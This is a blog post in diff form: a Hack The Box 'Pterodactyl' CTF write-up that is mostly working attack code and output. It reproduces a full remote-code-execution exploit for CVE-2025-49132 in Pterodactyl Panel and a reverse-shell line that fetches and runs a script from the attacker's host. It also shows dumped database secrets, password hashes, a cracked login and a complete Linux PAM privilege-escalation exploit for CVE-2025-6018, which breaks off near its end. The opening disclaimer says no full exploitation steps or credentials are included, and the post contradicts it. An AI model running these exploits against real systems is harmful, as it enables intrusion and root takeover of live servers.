@@ -1,0 +1,918 @@
+---
+title: Pterodactyl
+description: "A guide to ctf challenge Pterodactyl from HACK THE BOX."
+pubDate: 2026-02-10
+heroImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/c9b2b698f60a9ab8da6c444a9f80e9bc.png?size=small&format=webp"
+author: "Koustubh Badshah"
+tags: ["htb", "Pterodactyl", "ctf", "writeup", "CVE-2025-6019", "CVE-2025-6018", "CVE-2025-49132"]
+---
+
+# Pterodactyl
+
+## ⚠️ Disclaimer
+
+<div style=" color: red;">
+The content published in this write-up is intended **strictly for educational and learning purposes**. 
+This post discusses concepts, methodologies, and high-level approaches related to **Hack The Box machine** and **does not include full solutions, flags, credentials, or step-by-step exploitation paths**.
+
+No sensitive information is disclosed that would compromise the integrity of active machines or violate Hack The Box’s rules. All analysis is based on publicly allowed practices and personal learning experiences.
+
+Readers are strongly encouraged to:
+- Follow **Hack The Box’s Code of Conduct**
+- Attempt the machines **independently**
+- Use this content only to **understand techniques**, not to shortcut challenges
+
+The author takes **no responsibility for misuse** of the information provided. Any testing or exploitation discussed should be performed **only in legal, authorized environments**.
+By engaging with this content, you agree to use it ethically and responsibly.
+
+</div>
+
+## Introduction
+
+Pterodactyl is medium difficulty linux machine on Hack the Box.
+
+### Reconnaissance
+
+I started with a nmap scan to identify running services and open ports.
+```bash
+nmap -sCSV -O -A -p- -T4 -v <Target-IP> 
+
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
+| ssh-hostkey:
+|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
+|_  256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
+80/tcp   open   http       nginx 1.21.5
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://pterodactyl.htb/
+|_http-server-header: nginx/1.21.5
+443/tcp  closed https
+8080/tcp closed http-proxy
+Aggressive OS guesses: Linux 5.0 - 5.14 (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 5.0 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%), Linux 3.2 - 4.14 (90%), Linux 2.6.32 - 3.10 (90%), MikroTik RouterOS 6.36 - 6.48 (Linux 3.3.5) (90%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 23.730 days (since Sun Jan 18 03:53:42 2026)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=254 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+``` 
+
+Adding the domain `pterodactyl.htb/` to `/etc/hosts` -> `echo "<Target-IP> pterodactyl.htb" | sudo tee -a /etc/hosts`.
+Further enumeration with `whatweb`
+```bash
+$ whatweb pterodactyl.htb/
+http://pterodactyl.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.21.5], IP[10.129.4.136], PHP[8.4.8], Script, Title[My Minecraft Server], X-Powered-By[PHP/8.4.8], nginx[1.21.5]
+```
+On enumeration through the gobuster, i found the following:
+```bash
+$ gobuster dir -w <path-to-wordlist> -u http://pterodactyl.htb
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://pterodactyl.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 153]
+/.htaccess            (Status: 403) [Size: 153]
+/.htpasswd            (Status: 403) [Size: 153]
+/index.php            (Status: 200) [Size: 1686]
+/phpinfo.php          (Status: 200) [Size: 73006]
+Progress: 4750 / 4750 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+Also enumerating the subdomains I got two subdomains `panel.pterodactyl.htb` and `play.pterodactyl.htb`.
+
+### Exploitation
+
+To obtain the initial foothold, I found that the pterodactyl **terodactyl Panel v1.11.10** is running which is vulnerable to RCE via [CVE-2025-49132](https://nvd.nist.gov/vuln/detail/CVE-2025-49132).
+
+I got the exploit from searching the web and found the following exploit code on [GitHub](https://github.com/malw0re/CVE-2025-49132---Pterodactyl-RCE-HTB-Season-10-/blob/main/ape1.py):
+```python
+#!/usr/bin/env python3
+"""
+CVE-2025-49132 PEAR Exploit - Improved Version
+Based on working exploit with enhanced output parsing and features
+"""
+
+import sys
+import subprocess
+import re
+import argparse
+
+class Colors:
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    END = '\033[0m'
+    BOLD = '\033[1m'
+
+def print_info(msg):
+    print(f"{Colors.BLUE}[*]{Colors.END} {msg}")
+
+def print_success(msg):
+    print(f"{Colors.GREEN}[+]{Colors.END} {msg}")
+
+def print_error(msg):
+    print(f"{Colors.RED}[-]{Colors.END} {msg}")
+
+def clean_output(raw_output):
+    """
+    Clean PEAR config output to extract actual command results
+    """
+    if not raw_output:
+        return None
+    
+    lines = raw_output.split('\n')
+    results = []
+    
+    for line in lines:
+        # Skip empty lines
+        if not line.strip():
+            continue
+            
+        # Look for command output patterns
+        if any(pattern in line for pattern in ['uid=', 'HTB{', 'root:', 'www-data', 'bin/', 'total ']):
+            # Clean up ANSI codes and PEAR artifacts
+            clean = re.sub(r'\x1b\[[0-9;]*m', '', line)  # Remove ANSI codes
+            clean = re.sub(r'.*?(uid=\d+.*?)\s+uid=.*', r'\1', clean)  # Remove duplicates
+            clean = clean.strip()
+            
+            if clean and clean not in results:
+                results.append(clean)
+    
+    # If we found specific patterns, return them
+    if results:
+        return '\n'.join(results)
+    
+    # Otherwise try regex extraction
+    patterns = [
+        r'(uid=\d+\([^)]+\)[^\n<]+)',  # uid output
+        r'(HTB\{[^}]+\})',  # HTB flags
+        r'(root:[^:]+:[^:]+:[^:]+:[^:]+:[^:]+:[^\n]+)',  # /etc/passwd format
+        r'(total\s+\d+.*)',  # ls output
+    ]
+    
+    for pattern in patterns:
+        match = re.search(pattern, raw_output, re.MULTILINE)
+        if match:
+            return match.group(1)
+    
+    # If nothing found, check if there's any non-JSON output
+    if not raw_output.strip().startswith('{'):
+        # Return first 500 chars of output
+        return raw_output[:500].strip()
+    
+    return None
+
+def exploit(host, command, pear_path="../../../../../../usr/share/php/PEAR", port=None, verbose=False):
+    """
+    Execute the PEAR exploit
+    """
+    # Escape spaces in command
+    payload = command.replace(' ', '\\$\\{IFS\\}')
+    
+    # Build URL with optional port
+    base_url = f"http://{host}:{port}" if port else f"http://{host}"
+    
+    print_info(f"Target: {base_url}")
+    print_info(f"PEAR Path: {pear_path}")
+    print_info(f"Command: {command}\n")
+    
+    # Step 1: Write payload
+    print_info("Writing payload to /tmp/shell.php...")
+    write_url = (
+        f'{base_url}/locales/locale.json?'
+        f'+config-create+/&'
+        f'locale={pear_path}&'
+        f'namespace=pearcmd&'
+        f'/<?=system(\'{payload}\')?>+/tmp/shell.php'
+    )
+    
+    if verbose:
+        print(f"Write URL: {write_url}\n")
+    
+    write_cmd = f'curl -s "{write_url}"'
+    write_result = subprocess.run(write_cmd, shell=True, capture_output=True, text=True)
+    
+    if verbose:
+        print(f"Write response: {write_result.stdout[:200]}\n")
+    
+    print_success("Payload written")
+    
+    # Step 2: Execute payload
+    print_info("Executing payload...")
+    exec_url = f'{base_url}/locales/locale.json?locale=../../../../../tmp&namespace=shell'
+    
+    if verbose:
+        print(f"Exec URL: {exec_url}\n")
+    
+    exec_cmd = f'curl -s "{exec_url}"'
+    exec_result = subprocess.run(exec_cmd, shell=True, capture_output=True, text=True)
+    
+    # Clean and display output
+    output = clean_output(exec_result.stdout)
+    
+    if output:
+        print_success("Command executed successfully!\n")
+        print(f"{Colors.BOLD}{'='*60}")
+        print("OUTPUT:")
+        print(f"{'='*60}{Colors.END}")
+        print(output)
+        print(f"{Colors.BOLD}{'='*60}{Colors.END}")
+        return True, output
+    else:
+        print_error("No output received or command failed")
+        if verbose:
+            print(f"\nRaw response:\n{exec_result.stdout[:500]}")
+        return False, None
+
+def interactive_shell(host, pear_path, port=None):
+    """
+    Provide an interactive shell
+    """
+    print_success("Entering interactive shell mode")
+    print_info("Type 'exit' or 'quit' to leave\n")
+    
+    while True:
+        try:
+            command = input(f"{Colors.GREEN}shell>{Colors.END} ").strip()
+            
+            if command.lower() in ['exit', 'quit', 'q']:
+                print_info("Exiting shell")
+                break
+            
+            if not command:
+                continue
+            
+            # Execute command
+            success, output = exploit(host, command, pear_path, port, verbose=False)
+            
+            if not success:
+                print_error("Command execution failed")
+            
+            print()  # Empty line for readability
+            
+        except KeyboardInterrupt:
+            print("\n")
+            print_info("Exiting shell")
+            break
+        except Exception as e:
+            print_error(f"Error: {e}")
+
+def find_pear_path(host, port=None):
+    """
+    Try to find the correct PEAR path
+    """
+    print_info("Searching for PEAR installation...\n")
+    
+    base_url = f"http://{host}:{port}" if port else f"http://{host}"
+    
+    pear_paths = [
+        ("../../../../../../usr/share/php/PEAR", "Debian/Ubuntu (php-pear package)"),
+        ("../../../../../../usr/lib/php8/PEAR", "PHP 8 (Alpine/custom)"),
+        ("../../../../../../usr/share/pear", "Alternative Debian/Ubuntu"),
+        ("../../../../../../usr/local/lib/php/PEAR", "Custom PHP install"),
+        ("../../../../../../opt/php/lib/php/PEAR", "Optional PHP install"),
+        ("../../../../../usr/share/php/PEAR", "Shallower web root (depth 5)"),
+        ("../../../../../../../usr/share/php/PEAR", "Deeper web root (depth 7)"),
+    ]
+    
+    for pear_path, description in pear_paths:
+        url = f'{base_url}/locales/locale.json?locale={pear_path}'
+        cmd = f'curl -s "{url}"'
+        
+        print(f"Testing: {description}")
+        print(f"  Path: {pear_path}")
+        
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        
+        # Check if PEAR-related content is found
+        if any(keyword in result.stdout.lower() for keyword in ['pear', 'pearcmd', 'system.php', 'config']):
+            print_success(f"Found PEAR at: {pear_path}\n")
+            return pear_path
+        
+        print_error("Not found")
+        print()
+    
+    print_error("PEAR not found in common locations")
+    print_info("You may need to specify the path manually with --pear-path")
+    return None
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='CVE-2025-49132 PEAR Exploit (Optimized)',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='''
+Examples:
+  # Execute single command
+  python3 exploit.py --host panel.pterodactyl.htb --command "id"
+  
+  # With custom PEAR path and port
+  python3 exploit.py --host 192.168.1.100 --port 8080 --command "whoami" --pear-path "../../../../../../usr/lib/php8/PEAR"
+  
+  # Interactive shell
+  python3 exploit.py --host panel.pterodactyl.htb --interactive
+  
+  # Find PEAR path
+  python3 exploit.py --host panel.pterodactyl.htb --find-pear
+  
+  # Verbose mode
+  python3 exploit.py --host panel.pterodactyl.htb --command "ls -la" -v
+        '''
+    )
+    
+    parser.add_argument('--host', required=True, help='Target hostname or IP')
+    parser.add_argument('--port', type=int, help='Target port (default: 80)')
+    parser.add_argument('--command', '-c', help='Command to execute')
+    parser.add_argument('--pear-path', default='../../../../../../usr/share/php/PEAR', 
+                        help='Path to PEAR (default: ../../../../../../usr/share/php/PEAR)')
+    parser.add_argument('--interactive', '-i', action='store_true', help='Interactive shell mode')
+    parser.add_argument('--find-pear', action='store_true', help='Search for PEAR path')
+    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
+    
+    args = parser.parse_args()
+    
+    print(f"""
+{Colors.BOLD}╔═══════════════════════════════════════════════════════════╗
+║           CVE-2025-49132 PEAR RCE Exploit                ║
+║           Target: {args.host:43s} ║
+╚═══════════════════════════════════════════════════════════╝{Colors.END}
+""")
+    
+    # Find PEAR path mode
+    if args.find_pear:
+        found_path = find_pear_path(args.host, args.port)
+        if found_path:
+            print_success(f"Use this path: --pear-path \"{found_path}\"")
+        return
+    
+    # Interactive mode
+    if args.interactive:
+        interactive_shell(args.host, args.pear_path, args.port)
+        return
+    
+    # Single command mode
+    if not args.command:
+        print_error("Please specify --command or use --interactive mode")
+        parser.print_help()
+        return
+    
+    exploit(args.host, args.command, args.pear_path, args.port, args.verbose)
+
+if __name__ == '__main__':
+    main()
+```
+
+I ran a python server to host the shell command in shell.sh `bash -i >& /dev/tcp/<your-ip>/1234 0>&1` and hosted it on my machine via `python3 -m http.server`.
+And started a netcat listner on my machine `nc -lnvp 1234` to catch the reverse shell.
+
+Then I ran the exploit with following command:
+```bash
+$ python3 exploit.py --host panel.pterodactyl.htb --interactive
+
+╔═══════════════════════════════════════════════════════════╗
+║           CVE-2025-49132 PEAR RCE Exploit                ║
+║           Target: panel.pterodactyl.htb                       ║
+╚═══════════════════════════════════════════════════════════╝
+
+[+] Entering interactive shell mode
+[*] Type 'exit' or 'quit' to leave
+
+shell> curl http://<your-ip>:8000/shell.sh | bash
+```
+
+The exploit successfully executed the command and I got a reverse shell on my netcat listener.
+
+Navigating to the home directory, I found the user.txt file and read the flag.
+
+I found the .env file in the pterodactyl directory and found the credentials for mysql database:
+```
+bash
+wwwrun@pterodactyl:/var/www/pterodactyl> cat .env
+cat .env
+APP_ENV=production
+APP_DEBUG=false
+APP_KEY=base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
+APP_THEME=pterodactyl
+APP_TIMEZONE=UTC
+APP_URL="http://panel.pterodactyl.htb"
+APP_LOCALE=en
+APP_ENVIRONMENT_ONLY=false
+
+LOG_CHANNEL=daily
+LOG_DEPRECATIONS_CHANNEL=null
+LOG_LEVEL=debug
+
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=panel
+DB_USERNAME=pterodactyl
+DB_PASSWORD=PteraPanel
+
+REDIS_HOST=127.0.0.1
+REDIS_PASSWORD=null
+REDIS_PORT=6379
+
+CACHE_DRIVER=redis
+QUEUE_CONNECTION=redis
+SESSION_DRIVER=redis
+
+HASHIDS_SALT=pKkOnx0IzJvaUXKWt2PK
+HASHIDS_LENGTH=8
+
+MAIL_MAILER=smtp
+MAIL_HOST=smtp.example.com
+MAIL_PORT=25
+MAIL_USERNAME=
+MAIL_PASSWORD=
+MAIL_ENCRYPTION=tls
+MAIL_FROM_ADDRESS=no-reply@example.com
+MAIL_FROM_NAME="Pterodactyl Panel"
+# You should set this to your domain to prevent it defaulting to 'localhost', causing
+# mail servers such as Gmail to reject your mail.
+#
+# @see: https://github.com/pterodactyl/panel/pull/3110
+# MAIL_EHLO_DOMAIN=panel.example.com
+
+APP_SERVICE_AUTHOR="pterodactyl@pterodactyl.htb"
+PTERODACTYL_TELEMETRY_ENABLED=false
+RECAPTCHA_ENABLED=false
+```
+
+Connecting to mysql database:
+```bash
+mysql -u pterodactyl -p PteraPanel -h 127.0.0.1 -P 3306 panel
+```
+
+From the database, I found the `users` table and found the password hash for the users:
+```sql
+SELECT * FROM users;
+id      external_id     uuid    username        email   name_first      name_last       password        remember_token  language        root_admin     use_totp totp_secret     totp_authenticated_at   gravatar        created_at      updated_at
+2       NULL    5e6d956e-7be9-41ec-8016-45e434de8420    headmonitor     headmonitor@pterodactyl.htb     Head    Monitor $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2    OL0dNy1nehBYdx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU    en      1       0       NULL    NULL    1       2025-09-16 17:15:41     2025-09-16 17:15:41
+3       NULL    ac7ba5c2-6fd8-4600-aeb6-f15a3906982b    phileasfogg3    phileasfogg3@pterodactyl.htb    Phileas Fogg    $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi    6XGbHcVLLV9fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8    en      0       0       NULL    NULL    1       2025-09-16 19:44:19     2025-11-07 18:28:50
+```
+
+I cracked the password for **phileasfogg3** using john the ripper and got the password `!QAZ2wsx`. 
+
+I SSHed into the machine using the credentials `phileasfogg3:!QAZ2wsx` and got a shell as `phileasfogg3`.
+
+### Privilege Escalation
+
+I ran some basic enumerations and found following results:
+```bash
+phileasfogg3@pterodactyl:~> uname -a
+Linux pterodactyl 6.4.0-150600.23.65-default #1 SMP PREEMPT_DYNAMIC Tue Aug 12 00:37:41 UTC 2025 (aedcb04) x86_64 x86_64 x86_64 GNU/Linux
+
+phileasfogg3@pterodactyl:~> id
+uid=1002(phileasfogg3) gid=100(users) groups=100(users)
+
+phileasfogg3@pterodactyl:~> cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+messagebus:x:499:499:User for D-Bus:/run/dbus:/usr/bin/false
+nobody:x:65534:65534:nobody:/var/lib/nobody:/bin/bash
+man:x:13:62:Manual pages viewer:/var/lib/empty:/usr/sbin/nologin
+mail:x:498:498:Mailer daemon:/var/spool/clientmqueue:/usr/sbin/nologin
+lp:x:497:497:Printing daemon:/var/spool/lpd:/usr/sbin/nologin
+daemon:x:2:2:Daemon:/sbin:/usr/sbin/nologin
+bin:x:1:1:bin:/bin:/usr/sbin/nologin
+chrony:x:496:482:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
+postfix:x:51:51:Postfix Daemon:/var/spool/postfix:/usr/sbin/nologin
+systemd-timesync:x:480:480:systemd Time Synchronization:/:/usr/sbin/nologin
+nscd:x:479:479:User for nscd:/run/nscd:/usr/sbin/nologin
+polkitd:x:478:478:User for polkitd:/var/lib/polkit:/usr/sbin/nologin
+rpc:x:477:65534:user for rpcbind:/var/lib/empty:/sbin/nologin
+statd:x:476:65533:NFS statd daemon:/var/lib/nfs:/sbin/nologin
+sshd:x:475:475:SSH daemon:/var/lib/sshd:/usr/sbin/nologin
+wwwrun:x:474:474:WWW daemon apache:/var/lib/wwwrun:/usr/sbin/nologin
+mysql:x:60:60:MySQL database admin:/var/lib/mysql:/usr/sbin/nologin
+redis:x:473:473:User for redis key-value store:/var/lib/redis:/usr/sbin/nologin
+nginx:x:472:472:User for nginx:/var/lib/nginx:/usr/sbin/nologin
+dockremap:x:471:471:docker --userns-remap=default:/:/usr/sbin/nologin
+pterodactyl:x:470:100::/home/pterodactyl:/usr/sbin/nologin
+headmonitor:x:1001:100::/home/headmonitor:/bin/bash
+phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
+_laurel:x:469:100::/var/log/laurel:/bin/false
+
+phileasfogg3@pterodactyl:~> sudo -l
+[sudo] password for phileasfogg3:
+Matching Defaults entries for phileasfogg3 on pterodactyl:
+    always_set_home, env_reset, env_keep="LANG LC_ADDRESS LC_CTYPE
+    LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY
+    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE
+    LINGUAS XDG_SESSION_COOKIE", !insults,
+    secure_path=/usr/sbin\:/usr/bin\:/sbin\:/bin, targetpw
+
+User phileasfogg3 may run the following commands on pterodactyl:
+    (ALL) ALL
+```
+
+This tells us that the user can run all commands as root via sudo. To get root access I further ran **linpeas** and found 
+```bash
+phileasfogg3@pterodactyl:~> cat /var/spool/mail/phileasfogg3
+From headmonitor@pterodactyl Fri Nov 07 09:15:00 2025
+Delivered-To: phileasfogg3@pterodactyl
+Received: by pterodactyl (Postfix, from userid 0)
+id 1234567890; Fri, 7 Nov 2025 09:15:00 +0100 (CET)
+From: headmonitor headmonitor@pterodactyl
+To: All Users all@pterodactyl
+Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)
+Message-ID: 202511070915.headmonitor@pterodactyl
+Date: Fri, 07 Nov 2025 09:15:00 +0100
+MIME-Version: 1.0
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Attention all users,
+
+Unusual activity has been observed from the udisks daemon (udisksd). No confirmed compromise at this time, but increased vigilance is required.
+
+Do not connect untrusted external media. Review your sessions for suspicious activity. Administrators should review udisks and system logs and apply pending updates.
+
+Report any signs of compromise immediately to headmonitor@pterodactyl.htb
+
+— HeadMonitor
+System Administrator
+```
+
+This email indicates that there is some unusual activity with `udisksd` which is a daemon used for managing disks. This could be a potential vector for privilege escalation.
+`udisksctl` is a command-line tool that interacts with the `udisksd` daemon. If there are vulnerabilities in `udisksd`, it might be possible to exploit them to gain elevated privileges.
+But it was not the case here, as the service was not accessible to do so I explioited the [CVE-2025-6018](https://nvd.nist.gov/vuln/detail/CVE-2025-6018).  This flaw allows an unprivileged 
+local attacker (for example, a user logged in via SSH) to obtain the elevated privileges normally reserved for a physically present, "allow_active" user. 
+
+To exploit this vulnerability, I used the following script avilable on https://www.exploit-db.com/exploits/52386:
+```bash
+# Exploit Title: Linux PAM Environment - Variable Injection Local Privilege Escalation
+# Exploit Author: @İbrahimsql
+# Exploit Author's github: https://github.com/ibrahmsql
+# Description: PAM pam_env.so module allows environment variable injection via ~/.pam_environment
+#              leading to privilege escalation through SystemD session manipulation
+# CVE: CVE-2025-6018, CVE-2025-6019
+# Vendor Homepage: https://github.com/linux-pam/linux-pam
+# Software Link: https://github.com/linux-pam/linux-pam/releases
+# Version: PAM 1.3.0 - 1.6.0 (vulnerable versions)
+# Category: Local Privilege Escalation
+# Requirements: paramiko>=2.12.0
+# Usage: python3 cve_2025_6018_professional.py -i target_ip -u username -p password
+# References: 
+#   - https://access.redhat.com/security/cve/CVE-2025-6018
+#   - https://bugzilla.redhat.com/show_bug.cgi?id=2372693
+#   - https://bugzilla.suse.com/show_bug.cgi?id=1243226
+
+import paramiko
+import time
+import sys
+import socket
+import argparse
+import logging
+from datetime import datetime
+
+# Setup logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S',
+    handlers=[
+        logging.FileHandler('cve_2025_6018_exploit.log'),
+        logging.StreamHandler(sys.stdout)
+    ]
+)
+logger = logging.getLogger(__name__)
+
+class CVEExploit:
+    def __init__(self):
+        self.vulnerable_versions = [
+            "pam-1.3.0", "pam-1.3.1", "pam-1.4.0", "pam-1.5.0", 
+            "pam-1.5.1", "pam-1.5.2", "pam-1.5.3", "pam-1.6.0"
+        ]
+        
+    def check_vulnerability(self, client):
+        """Enhanced vulnerability detection"""
+        logger.info("Starting vulnerability assessment")
+        
+        checks = {
+            "pam_version": "rpm -q pam || dpkg -l | grep libpam",
+            "pam_env": "find /etc/pam.d/ -name '*' -exec grep -l 'pam_env' {} \\; 2>/dev/null",
+            "pam_systemd": "find /etc/pam.d/ -name '*' -exec grep -l 'pam_systemd' {} \\; 2>/dev/null",
+            "systemd_version": "systemctl --version | head -1"
+        }
+
+        vulnerable = False
+        
+        for check_name, command in checks.items():
+            logger.info(f"Executing check: {check_name}")
+            try:
+                stdin, stdout, stderr = client.exec_command(command, timeout=10)
+                output = stdout.read().decode().strip()
+                
+                if check_name == "pam_version":
+                    for vuln_ver in self.vulnerable_versions:
+                        if vuln_ver in output:
+                            logger.info(f"Vulnerable PAM version detected: {vuln_ver}")
+                            vulnerable = True
+                            break
+                            
+                elif check_name == "pam_env" and output:
+                    logger.info("pam_env.so configuration found")
+                    vulnerable = True
+                    
+                elif check_name == "pam_systemd" and output:
+                    logger.info("pam_systemd.so found - escalation vector available")
+                    
+                if output and check_name != "pam_version":
+                    logger.debug(f"Command output: {output[:100]}...")
+                    
+            except Exception as e:
+                logger.warning(f"Check {check_name} failed: {e}")
+            
+            time.sleep(0.5)
+
+        return vulnerable
+
+    def create_malicious_environment(self, client):
+        """Create enhanced .pam_environment file"""
+        logger.info("Creating malicious environment file")
+        
+        payload = '''# CVE-2025-6018 Environment Poisoning
+XDG_SEAT OVERRIDE=seat0
+XDG_VTNR OVERRIDE=1
+XDG_SESSION_TYPE OVERRIDE=x11
+XDG_SESSION_CLASS OVERRIDE=user
+XDG_RUNTIME_DIR OVERRIDE=/tmp/runtime
+SYSTEMD_LOG_LEVEL OVERRIDE=debug'''
+
+        try:
+            logger.info("Writing .pam_environment file")
+            cmd = f"cat > ~/.pam_environment << 'EOF'\n{payload}\nEOF"
+            stdin, stdout, stderr = client.exec_command(cmd)
+            
+            # Verify creation
+            stdin, stdout, stderr = client.exec_command("cat ~/.pam_environment")
+            output = stdout.read().decode()
+            
+            if "OVERRIDE" in output:
+                logger.info("Malicious environment file created successfully")
+                return True
+            else:
+                logger.error("Failed to create environment file")
+                return False
+                
+        except Exception as e:
+            logger.error(f"Environment poisoning failed: {e}")
+            return False
+
+    def test_privilege_escalation(self, client):
+        """Test privilege escalation vectors"""
+        logger.info("Testing privilege escalation vectors")
+        
+        tests = [
+            ("SystemD Reboot", "gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot", "yes"),
+            ("SystemD Shutdown", "gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanPowerOff", "yes"),
+            ("PolicyKit Check", "pkcheck --action-id org.freedesktop.policykit.exec --process $$ 2>/dev/null || echo 'denied'", "authorized")
+        ]
+        
+        escalated = False
+        
+        for test_name, command, success_indicator in tests:
+            logger.info(f"Testing: {test_name}")
+            try:
+                stdin, stdout, stderr = client.exec_command(command, timeout=10)
+                output = stdout.read().decode().strip()
+                
+                if success_indicator in output.lower():
+                    logger.info(f"PRIVILEGE ESCALATION DETECTED: {test_name}")
+                    escalated = True
+                else:
+                    logger.info(f"No escalation detected: {test_name}")
+                    
+            except Exception as e:
+                logger.warning(f"Test {test_name} failed: {e}")
+        
+        return escalated
+
+    def interactive_shell(self, client):
+        """Professional interactive shell"""
+        logger.info("Starting interactive shell session")
+
+        shell = client.invoke_shell()
+        shell.send("export PS1='exploit$ '\n")
+        time.sleep(1)
+        
+        # Clear buffer
+        while shell.recv_ready():
+            shell.recv(1024)
+
+        print("\n--- Interactive Shell ---")
+        print("Commands: 'exit' to quit, 'status' for privilege check")
+        
+        while True:
+            try:
+                command = input("exploit$ ")
+                
+                if command.lower() == 'exit':
+                    break
+                elif command.lower() == 'status':
+                    stdin, stdout, stderr = client.exec_command("id && groups")
+                    print(stdout.read().decode())
+                    continue
+
+                shell.send(command + "\n")
+                time.sleep(0.5)
+                
+                while shell.recv_ready():
+                    output = shell.recv(1024).decode('utf-8', errors='ignore')
+                    print(output, end='')
+                    
+            except KeyboardInterrupt:
+                logger.warning("Use 'exit' to quit properly")
+            except Exception as e:
+                logger.error(f"Shell error: {e}")
+                break
+
+    def run_exploit(self, hostname, username, password=None, key_filename=None, port=22):
+        """Main exploit execution"""
+        logger.info(f"Starting CVE-2025-6018 exploit against {hostname}:{port}")
+        
+        try:
+            # Initial connection
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+            logger.info(f"Connecting to {hostname}:{port} as {username}")
+            client.connect(hostname, port=port, username=username, 
+                           password=password, key_filename=key_filename, timeout=10)
+            logger.info("SSH connection established")
+
+            # Check vulnerability
+            if not self.check_vulnerability(client):
+                logger.error("Target does not appear vulnerable to CVE-2025-6018/6019")
+                return False
+
+            logger.info("Target appears vulnerable, proceeding with exploitation")
+
+            # Create malicious environment
+            if not self.create_malicious_environment(client):
+                logger.error("Failed to create malicious environment")
+                return False
+
+            logger.info("Reconnecting to trigger PAM environment loading")
+            client.close()
+            time.sleep(2)
+
+            # Reconnect to trigger PAM
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(hostname, port=port, username=username, 
+                           password=password, key_filename=key_filename)
+            logger.info("Reconnection successful")
+
+            # Test privilege escalation
+            if self.test_privilege_escalation(client):
+                logger.info("EXPLOITATION SUCCESSFUL - Privilege escalation confirmed")
+                self.interactive_shell(client)
+            else:
+                logger.warning("No clear privilege escalation detected")
+                logger.info("Manual verification may be required")
+
+            return True
+
+        except paramiko.AuthenticationException:
+            logger.error("Authentication failed - check credentials")
+        except paramiko.SSHException as e:
+            logger.error(f"SSH error: {e}")
+        except socket.error as e:
+            logger.error(f"Network error: {e}")
+        except Exception as e:
+            logger.error(f"Unexpected error: {e}")
+        finally:
+            try:
+                client.close()
+            except:
+                pass
+            logger.info("Connection closed")
+
+        return False
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="CVE-2025-6018/6019 PAM Environment Injection Exploit",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  python3 %(prog)s -i 192.168.1.100 -u testuser -p password123
+  python3 %(prog)s -i target.com -u admin -k ~/.ssh/id_rsa
+        """
+    )
+
+    parser.add_argument("-i", "--hostname", required=True, help="Target hostname or IP")
+    parser.add_argument("-u", "--username", required=True, help="SSH username")
+    parser.add_argument("-p", "--password", help="SSH password")
+    parser.add_argument("-k", "--key", dest="key_filename", help="SSH private key file")
+    parser.add_argument("--port", type=int, default=22, help="SSH port (default: 22)")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
+
+    args = parser.parse_args()
+
+    if args.verbose:
+        logging.getLogger().setLevel(logging.DEBUG)
+
+    if not args.password and not args.key_filename:
+        parser.error("Provide either password (-p) or private key (-k)")
+
+    # Security warning
+    logger.warning("Use only with proper authorization!")
+    
+    exploit = CVEExploit()
+    success = exploit.run_exploit(
+        hostname=args.hostname,
+        username=args.username,
+        password=args.password,
+        key_filename=args.key_filename,
+        port=args.port
+    )
+    
+    sys.exit(0 if success else 1)
+
